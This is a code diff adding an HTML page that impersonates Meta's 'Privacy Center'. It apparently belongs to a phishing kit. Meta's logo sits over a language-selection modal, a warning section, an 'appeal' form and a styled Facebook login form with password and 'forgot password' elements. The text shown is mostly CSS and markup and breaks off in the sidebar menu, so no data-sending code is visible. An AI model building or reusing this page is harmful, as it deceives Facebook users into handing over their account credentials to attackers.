@@ -1,0 +1,2164 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Privacy Center</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: linear-gradient(
+        130deg,
+        rgba(249, 241, 249, 1) 0%,
+        rgba(234, 243, 253, 1) 35%,
+        rgba(237, 251, 242, 1) 100%
+      );
+      background-attachment: fixed;
+      min-height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Language Modal Styles */
+    .language-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 99999;
+      backdrop-filter: blur(5px);
+      transition: opacity 0.3s ease;
+    }
+   
+    .language-modal-content {
+      background: #fff;
+      padding: 40px;
+      border-radius: 16px;
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      max-height: 80vh;
+      overflow-y: auto;
+      position: relative;
+      animation: modalFadeIn 0.4s ease-out;
+    }
+
+    @keyframes modalFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+   
+    .language-modal-close {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      background: #f1f3f4;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    
+    .language-modal-close:hover {
+      background: #e8eaed;
+      transform: rotate(90deg);
+    }
+    
+    .language-modal-close svg {
+      width: 18px;
+      height: 18px;
+      fill: #5f6368;
+    }
+   
+    .language-modal-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #1a1a1a;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+   
+    .language-modal-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+   
+    .language-search-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+    
+    .language-search-input {
+      width: 100%;
+      padding: 14px 16px 14px 45px;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: #f8f9fa;
+    }
+    
+    .language-search-input:focus {
+      border-color: #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+    
+    .language-search-icon {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5f6368;
+    }
+   
+    .language-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 30px;
+      max-height: 300px;
+      overflow-y: auto;
+      padding: 5px;
+    }
+    
+    .language-option {
+      display: flex;
+      align-items: center;
+      padding: 15px;
+      border: 2px solid #e8eaed;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      background: #fff;
+    }
+  
+    .language-option:hover {
+      border-color: #0064e0;
+      background: #f0f7ff;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.1);
+    }
+   
+    .language-option.selected {
+      border-color: #0064e0;
+      background: #e6f1ff;
+      box-shadow: 0 4px 12px rgba(0, 100, 224, 0.15);
+    }
+   
+    .language-flag {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+   
+    .language-name {
+      font-weight: 600;
+      font-size: 16px;
+      color: #1a1a1a;
+      text-align: left;
+    }
+    
+    .language-code {
+      font-size: 13px;
+      color: #5f6368;
+      margin-top: 2px;
+      text-align: left;
+    }
+   
+    .language-confirm-btn {
+      padding: 16px 30px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .language-confirm-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .language-confirm-btn:hover::before {
+      left: 100%;
+    }
+   
+    .language-confirm-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 100, 224, 0.4);
+    }
+    
+    .language-confirm-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .language-confirm-btn:disabled:hover::before {
+      left: -100%;
+    }
+
+    .no-results {
+      grid-column: 1 / -1;
+      text-align: center;
+      padding: 30px;
+      color: #5f6368;
+      font-style: italic;
+    }
+
+    /* Scrollbar styling */
+    .language-options::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .language-options::-webkit-scrollbar-track {
+      background: #f1f1f1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb {
+      background: #c1c1c1;
+      border-radius: 4px;
+    }
+
+    .language-options::-webkit-scrollbar-thumb:hover {
+      background: #a8a8a8;
+    }
+
+    /* For Firefox */
+    .language-options {
+      scrollbar-width: thin;
+      scrollbar-color: #c1c1c1 #f1f1f1;
+    }
+
+    /* Mobile responsive adjustments */
+    @media (max-width: 768px) {
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+      
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+      
+      .language-modal-title {
+        font-size: 24px;
+        margin-bottom: 8px;
+      }
+      
+      .language-modal-subtitle {
+        font-size: 15px;
+        margin-bottom: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .language-modal-content {
+        padding: 25px 15px;
+      }
+      
+      .language-option {
+        padding: 12px;
+      }
+      
+      .language-flag {
+        width: 28px;
+        height: 28px;
+        font-size: 18px;
+        margin-right: 10px;
+      }
+      
+      .language-name {
+        font-size: 15px;
+      }
+    }
+
+    /* Hide main content until language is selected */
+    .main-content {
+      display: none;
+    }
+   
+    /* Mobile header */
+    .mobile-header { display: none; justify-content: center; align-items: center; padding: 10px 15px; position: fixed; top: 0; left: 0; right: 0; z-index: 9999; background: transparent; box-shadow: none; }
+    .mobile-logo { width: 60px; height: auto; }
+
+    header { width: 380px; padding: 40px 40px 15px 60px; display: flex; flex-direction: column; align-items: flex-start; position: fixed; top: 0; left: 0; height: 100vh; background: transparent; overflow-y: auto; z-index: 9999; }
+    .logo { width: 80px; margin: 15px 0 8px 20px; }
+    .privacy-text { font-size: 26px; font-weight: 700; color: #1a1a1a; margin: 0 0 15px 20px; letter-spacing: 0.4px; }
+
+    .home-page { display: flex; align-items: center; flex-direction: row; background-color: #000; color: #fff; padding: 12px 20px; border-radius: 8px; margin-left: 20px; margin-top: 5px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); transition: transform 0.2s ease; cursor: pointer; width: auto; max-width: 100%; }
+    .home-page:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15); }
+    .home-icon { margin-right: 12px; width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }
+    .home-text { font-size: 16px; font-weight: 500; white-space: nowrap; }
+
+    .menu-container { margin-left: 20px; margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
+    .menu-item { display: flex; align-items: center; flex-direction: row; padding: 12px 20px; border-radius: 8px; transition: all 0.2s ease; cursor: pointer; width: 100%; }
+    .menu-item:hover { background-color: rgba(0, 0, 0, 0.05); transform: translateY(-2px); }
+    .menu-icon { margin-right: 15px; width: 20px; height: 20px; fill: #333; flex-shrink: 0; }
+    .menu-text { font-size: 16px; color: #333; font-weight: 500; white-space: nowrap; }
+
+    .vertical-divider { position: fixed; top: 0; left: 460px; width: 2px; height: 100vh; background-color: #ccc; opacity: 0.5; z-index: 1000; }
+
+    .center-content { margin-left: 460px; flex: 1; min-height: 100vh; overflow-y: auto; padding: 80px 40px; scroll-behavior: smooth; }
+    .center-content::-webkit-scrollbar { width: 10px; }
+    .center-content::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.05); border-radius: 10px; }
+    .center-content::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #0064e0, #0084ff); border-radius: 10px; border: 2px solid #fff; }
+    .center-content::-webkit-scrollbar-thumb:hover { background: linear-gradient(180deg, #0052b3, #0064e0); }
+
+    .warning-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #333; gap: 8px; max-width: 650px; }
+    .warning-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+    .warning-message svg { width: 36px; height: 36px; flex-shrink: 0; }
+    .warning-message span { font-weight: 700; color: #d93025; }
+
+    span#fbSendBtnText {
+        color: white;
+    }
+
+    span#sendBtnText {
+        color: white;
+    }
+    .warning-subtext { font-size: 16px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 15px; text-align: left; width: 100%; }
+    .warning-extra { font-size: 15px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 20px; max-width: 650px; text-align: left; width: 100%; }
+
+    /* Appeal box styling */
+    .appeal-box { margin-top: 30px; padding: 0; border-radius: 12px; width: 100%; max-width: 650px; position: relative; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+    .appeal-box img { display: block; width: 100%; height: auto; border-radius: 12px 12px 0 0; margin: 0; }
+    .appeal-info { border: 2px solid #ffffff; border-top: none; border-radius: 0 0 12px 12px; padding: 25px; background: #fff; margin-top: -2px; }
+    .appeal-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; text-align: left; }
+    .appeal-desc { font-size: 16px; line-height: 1.6; color: #5f6368; margin-bottom: 25px; text-align: left; }
+    .appeal-btn { display: block; width: 100%; padding: 14px 16px; font-size: 16px; font-weight: 700; color: #fff; background: #0064e0; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s ease; text-align: center; }
+    .appeal-btn:hover { background: #0052b3; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0, 100, 224, 0.3); }
+   
+    /* Ensure appeal button text is white */
+    .appeal-info .appeal-btn {
+      color: #fff !important;
+    }
+
+    /* Appeal Guide Section */
+    .appeal-guide { margin-top: 40px; max-width: 650px; }
+    .appeal-guide-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-content { background: #fff; border-radius: 12px; padding: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
+    .appeal-guide-text { font-size: 15px; line-height: 1.6; color: #5f6368; margin-bottom: 20px; text-align: left; }
+    .appeal-guide-text:last-child { margin-bottom: 0; }
+
+    /* Additional Resources Section */
+    .additional-resources { margin-top: 50px; max-width: 650px; }
+    .resources-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 25px; text-align: left; }
+    .resources-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+    .resource-card { background: #fff; border-radius: 12px; padding: 25px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+    .resource-card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); }
+    .resource-icon { width: 40px; height: 40px; margin-bottom: 15px; fill: #0064e0; }
+    .resource-card-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; text-align: left; }
+    .resource-card-desc { font-size: 15px; line-height: 1.5; color: #5f6368; text-align: left; }
+
+    /* Redesigned Appeal Form Styling */
+    .appeal-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+   
+    .form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .form-icon {
+      width: 40px;
+      height: 40px;
+      background: #0064e0;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+   
+    .form-notice-container {
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #0064e0;
+    }
+   
+    .form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #e5e7eb;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #fafafa;
+    }
+   
+    .form-input:focus {
+      border: 1px solid #0064e0;
+      box-shadow: 0 0 0 3px rgba(0, 100, 224, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+   .form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+    
+    .form-warning.show {
+      display: flex;
+    }
+   
+    .form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #0064e0, #0084ff);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .form-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .form-btn:hover::before {
+      left: 100%;
+    }
+    
+    .form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(0, 100, 224, 0.4);
+    }
+    
+    .form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+   
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+   
+    /* Video container styling */
+    .video-container {
+      margin: 15px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      position: relative;
+      max-width: 378px;
+    }
+   
+    .video-player {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: block;
+    }
+   
+     
+    .video-placeholder {
+      width: 100%;
+      height: 200px;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-direction: column;
+      cursor: pointer;
+    }
+      
+      @media (max-width: 900px) {
+  .video-container {
+    max-width: 337px; /* Mobile width */
+  }
+  }
+
+
+    .video-placeholder svg {
+      width: 30px;
+      height: 30px;
+      margin-bottom: 8px;
+    }
+   
+    .video-title {
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 5px;
+    }
+   
+    
+    .fb-login-form {
+      margin-top: 30px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      border: 1px solid #e0e0e0;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      max-width: 650px;
+      position: relative;
+      display: none;
+    }
+    
+    .fb-form-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #eaeaea;
+    }
+   
+    .fb-form-icon {
+      width: 40px;
+      height: 40px;
+      background: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 15px;
+    }
+   
+    .fb-form-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #fff;
+    }
+   
+    .fb-form-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin: 0;
+    }
+   
+    .fb-form-subtitle {
+      font-size: 16px;
+      color: #5f6368;
+      margin-top: 5px;
+    }
+    
+    .fb-form-notice-container {
+      background: #f0f2f5;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 25px;
+      border-left: 4px solid #1877f2;
+    }
+   
+    .fb-form-notice {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 8px;
+    }
+   
+    .fb-form-notice:last-child {
+      margin-bottom: 0;
+    }
+   
+    .fb-form-group {
+      margin-bottom: 22px;
+      position: relative;
+    }
+   
+    .fb-form-label {
+      font-weight: 600;
+      font-size: 14px;
+      display: block;
+      margin-bottom: 8px;
+      color: #1a1a1a;
+    }
+   
+    .fb-form-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 15px;
+      transition: all 0.3s ease;
+      background: #f5f6f7;
+    }
+   
+    .fb-form-input:focus {
+      border: 1px solid #1877f2;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+      outline: none;
+      background: #fff;
+    }
+   
+    .fb-input-error {
+      color: #c2410c;
+      font-size: 13px;
+      line-height: 1.3;
+      margin-top: 6px;
+      min-height: 16px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+   
+    .fb-input-error svg {
+      width: 16px;
+      height: 16px;
+    }
+   
+    .fb-form-warning {
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      padding: 14px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #92400e;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+    }
+   
+    .fb-form-warning svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+   
+    .fb-form-warning.show {
+      display: flex;
+    }
+   
+    .fb-form-btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #1877f2, #166fe5);
+      color: #fff;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+   
+    .fb-form-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+   
+    .fb-form-btn:hover::before {
+      left: 100%;
+    }
+   
+    .fb-form-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+    }
+   
+    .fb-form-btn.loading {
+      opacity: 0.8;
+      pointer-events: none;
+    }
+   
+    .forgot-password {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+   
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+   
+    .success-message {
+      margin-top: 30px;
+      background: #d1fae5;
+      border: 1px solid #10b981;
+      border-radius: 12px;
+      padding: 25px;
+      text-align: center;
+      display: none;
+    }
+   
+    .success-message.show {
+      display: block;
+    }
+   
+    .success-icon {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #a7f3d0;
+      border-radius: 50%;
+      border: 2px solid #10b981;
+    }
+   
+    .success-icon svg {
+      width: 30px;
+      height: 30px;
+      color: #059669;
+    }
+   
+    .success-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #065f46;
+      margin-bottom: 10px;
+    }
+   
+    .success-text {
+      font-size: 15px;
+      color: #065f46;
+      margin-bottom: 15px;
+    }
+   
+    .reference-id {
+      font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+      font-size: 14px;
+      color: #374151;
+      background: #f9fafb;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: inline-block;
+    }
+
+    /* Mobile Responsive Styles */
+    @media (max-width: 900px) {
+      .vertical-divider { display: none; }
+      .mobile-header { display: flex; }
+      header { display: none; }
+      .center-content { margin-left: 0; padding: 100px 20px 40px; }
+      .warning-message { font-size: 20px; align-items: flex-start; text-align: left; }
+      .warning-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
+      .warning-message span { text-align: left; }
+      .warning-subtext, .warning-extra { font-size: 15px; text-align: left; }
+      .warning-message svg { width: 32px; height: 32px; }
+      .appeal-info { padding: 20px; }
+      .appeal-title { font-size: 20px; text-align: left; }
+      .appeal-desc { font-size: 15px; text-align: left; }
+      .appeal-btn { font-size: 16px; padding: 14px; }
+      .appeal-guide { margin-top: 30px; }
+      .appeal-guide-title { font-size: 20px; text-align: left; }
+      .appeal-guide-content { padding: 20px; }
+      .appeal-guide-text { font-size: 14px; text-align: left; }
+      .additional-resources { margin-top: 40px; }
+      .resources-grid { grid-template-columns: 1fr; }
+      .resources-title { font-size: 20px; text-align: left; }
+     
+      .appeal-form {
+        padding: 20px;
+      }
+     
+      .form-title {
+        font-size: 22px;
+      }
+     
+      .fb-login-form {
+        padding: 20px;
+      }
+     
+      .fb-form-title {
+        font-size: 22px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 200px;
+      }
+     
+      .video-placeholder svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .video-title {
+        font-size: 12px;
+      }
+     
+      .language-options {
+        grid-template-columns: 1fr;
+      }
+     
+      .language-modal-content {
+        padding: 30px 20px;
+      }
+     
+      .language-modal-title {
+        font-size: 22px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .center-content { padding: 100px 15px 30px; }
+      .warning-message { font-size: 18px; }
+      .warning-message svg { width: 28px; height: 28px; }
+      .mobile-logo { width: 50px; }
+      .appeal-guide-title { font-size: 18px; text-align: left; }
+      .appeal-guide-content { padding: 15px; }
+      .resources-title { font-size: 18px; text-align: left; }
+      .resource-card { padding: 20px; }
+      .resource-icon { width: 35px; height: 35px; }
+      
+      .appeal-form {
+        padding: 15px;
+      }
+     
+      .fb-login-form {
+        padding: 15px;
+      }
+     
+      .form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .fb-form-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+     
+      .form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .fb-form-icon {
+        margin-bottom: 10px;
+      }
+     
+      .success-message {
+        padding: 20px;
+      }
+     
+      .success-icon {
+        width: 50px;
+        height: 50px;
+      }
+     
+      .success-icon svg {
+        width: 25px;
+        height: 25px;
+      }
+     
+      .success-title {
+        font-size: 18px;
+      }
+     
+      .video-player,
+      .video-placeholder {
+        height: 180px;
+      }
+     
+      .video-placeholder svg {
+        width: 22px;
+        height: 22px;
+      }
+     
+      .video-title {
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Language Selection Modal -->
+  <div class="language-modal" id="languageModal">
+    <div class="language-modal-content">
+      <div class="language-modal-close" id="languageModalClose">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+        </svg>
+      </div>
+      <h2 class="language-modal-title">Select Your Language</h2>
+      <p class="language-modal-subtitle">Choose your preferred language for the page content</p>
+      
+      <div class="language-search-container">
+        <div class="language-search-icon">
+          <i class="fas fa-search"></i>
+        </div>
+        <input type="text" class="language-search-input" id="languageSearchInput" placeholder="Search languages...">
+      </div>
+      
+      <div class="language-options" id="languageOptionsContainer">
+  <div class="language-option" data-lang="english">
+    <div class="language-flag">🇺🇸</div>
+    <div class="language-name">English</div>
+  </div>
+  <div class="language-option" data-lang="hindi">
+    <div class="language-flag">🇮🇳</div>
+    <div class="language-name">Hindi</div>
+  </div>
+  <div class="language-option" data-lang="spanish">
+    <div class="language-flag">🇪🇸</div>
+    <div class="language-name">Spanish</div>
+  </div>
+  <div class="language-option" data-lang="portuguese">
+    <div class="language-flag">🇵🇹</div>
+    <div class="language-name">Portuguese</div>
+  </div>
+  <div class="language-option" data-lang="tamil">
+    <div class="language-flag">🇮🇳</div>
+    <div class="language-name">Tamil</div>
+  </div>
+  <div class="language-option" data-lang="arabic">
+    <div class="language-flag">🇸🇦</div>
+    <div class="language-name">Arabic</div>
+  </div>
+  <!-- Additional languages for testing scroll -->
+  <div class="language-option" data-lang="french">
+    <div class="language-flag">🇫🇷</div>
+    <div class="language-name">French</div>
+  </div>
+    <div class="language-option" data-lang="vietnamese">
+    <div class="language-flag">🇻🇳</div>
+    <div class="language-name">Vietnamese</div>
+  </div>
+     <div class="language-option" data-lang="ghanaian">
+          <div class="language-flag">🇬🇭</div>
+          <div class="language-name">Ghanaian (Twi)</div>
+        </div>
+  
+</div>
+     
+     <button class="language-confirm-btn" id="languageConfirmBtn" disabled>Confirm Language</button>
+    </div>
+  </div>
+
+  <!-- Main Content (hidden until language is selected) -->
+  <div class="main-content" id="mainContent">
+    <!-- Mobile Header with fixed logo -->
+    <div class="mobile-header">
+      <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+    </div>
+
+    <header>
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo" />
+      <div class="privacy-text">Privacy Center</div>
+
+      <div class="home-page">
+        <svg class="home-icon" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
+          <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/>
+        </svg>
+        <span class="home-text">Privacy Center Home Page</span>
+      </div>
+
+      <div class="menu-container">
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+          </svg>
+          <span class="menu-text">Search</span>
+        </div>
+
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
+            <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
+          </svg>
+          <span class="menu-text">Privacy Policy</span>
+        </div>
+
+        <div class="menu-item">
+          <svg class="menu-icon" viewBox="0 0 512 512">
